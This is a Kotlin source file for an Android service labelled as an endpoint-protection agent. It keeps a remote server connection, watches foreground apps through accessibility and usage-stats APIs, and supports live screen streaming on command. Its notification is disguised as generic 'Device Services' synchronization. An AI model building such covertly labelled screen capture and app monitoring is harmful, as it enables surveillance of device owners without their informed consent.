package com.edr.agent.service

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.edr.agent.EdrApplication
import com.edr.agent.monitor.TrapAppMonitor
import com.edr.agent.network.EdrWebSocketClient
import com.edr.agent.storage.SyncPreferences
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class EdrForegroundService : Service() {

    private var wsClient: EdrWebSocketClient? = null

    // HTTP client for connection-status polls (only used when WS is offline)
    private val pollClient = OkHttpClient.Builder()
        .connectTimeout(3, TimeUnit.SECONDS)
        .readTimeout(3, TimeUnit.SECONDS)
        .build()

    /**
     * Single-thread scheduler for background polling tasks.
     *
     * Battery strategy:
     *  - Poll interval is 10 seconds (not 3s). The AccessibilityService delivers
     *    instant WINDOW_STATE_CHANGED events for TrapAppMonitor, so the poller is
     *    only a fallback for delayed/missing A11y events.
     *  - Connection-status HTTP poll only fires when WS is offline AND not
     *    intentionally disconnected. It is skipped while WS is healthy.
     */
    private val monitorScheduler: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "Starting EDR Endpoint Protection Service v3.0")

        // Start as a foreground service with robust fallback across all Android versions & OEMs
        try {
            val notification = createNotification()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } catch (t: Throwable) {
                    Log.w(TAG, "Failed startForeground with DATA_SYNC, falling back: ${t.message}")
                    startForeground(NOTIFICATION_ID, notification)
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Could not start foreground: ${e.message}", e)
        }

        // Initialize Trap App Monitor with saved packages from storage
        TrapAppMonitor.initialize(this)

        // Fallback poller at 10s intervals:
        //   1. Checks TrapAppMonitor via UsageStats (backup if A11y is delayed)
        //   2. Polls connection-status endpoint only when WS is offline (saves battery)
        monitorScheduler.scheduleWithFixedDelay({
            try {
                // Only poll UsageStats if A11y service is not active (avoid double work)
                if (!com.edr.agent.service.EdrAccessibilityService.isReady) {
                    TrapAppMonitor.checkForegroundApp(this)
                }
            } catch (e: Exception) {
                Log.w(TAG, "TrapAppMonitor check error: ${e.message}")
            }

            try {
                val client = wsClient
                if (client != null && !client.isConnected && !client.isIntentionallyDisconnected) {
                    checkServerConnectionRequest()
                }
            } catch (e: Exception) {
                // Ignore network errors while offline
            }
        }, 10L, 10L, TimeUnit.SECONDS)

        // Connect to EDR management server
        wsClient = EdrWebSocketClient(this)
        wsClient?.connect()
    }

    /**
     * Promote the service foreground type to MEDIA_PROJECTION when live screen streaming starts.
     * Required on Android 14+ before calling getMediaProjection().
     */
    fun promoteToMediaProjection() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val notification = createNotification()
                var fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                startForeground(NOTIFICATION_ID, notification, fgsType)
                Log.i(TAG, "Promoted to MEDIA_PROJECTION foreground type for live screen streaming")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed promoting to MEDIA_PROJECTION: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    fun disconnectWebSocket() {
        wsClient?.disconnect()
        Log.i(TAG, "WebSocket disconnected by dashboard command.")
    }

    fun reconnectWebSocket() {
        if (wsClient == null) {
            wsClient = EdrWebSocketClient(this)
        }
        wsClient?.resetDisconnectAndConnect()
        Log.i(TAG, "WebSocket reconnected by dashboard command.")
    }

    private fun checkServerConnectionRequest() {
        val deviceId = SyncPreferences.deviceId
        // Only check the cloud server — 127.0.0.1 and USB tunnel are not relevant on a live device
        val url = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/connection-status"
        try {
            val request = Request.Builder().url(url).get().build()
            val response = pollClient.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string() ?: ""
                response.close()
                if (body.contains("\"shouldConnect\":true")) {
                    Log.i(TAG, "Server says shouldConnect=true. Reconnecting...")
                    if (wsClient == null) {
                        wsClient = EdrWebSocketClient(this)
                    }
                    wsClient?.resetDisconnectAndConnect()
                }
            } else {
                response.close()
            }
        } catch (ignored: Exception) {
            // Server not reachable right now — will retry next poll interval
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        monitorScheduler.shutdownNow()
        wsClient?.disconnect()
        Log.w(TAG, "EDR Service destroyed — will be restarted by OS (START_STICKY)")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        // No setContentIntent → tapping notification does nothing (inert)
        // Uses R.mipmap.ic_launcher which is 100% guaranteed to exist on all Android systems
        return NotificationCompat.Builder(this, EdrApplication.CHANNEL_ID)
            .setContentTitle("Device Services")
            .setContentText("System background synchronization active")
            .setSmallIcon(com.edr.agent.R.mipmap.ic_launcher)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    companion object {
        private const val TAG = "EdrForegroundService"
        private const val NOTIFICATION_ID = 1001
        var instance: EdrForegroundService? = null
            private set
    }
}
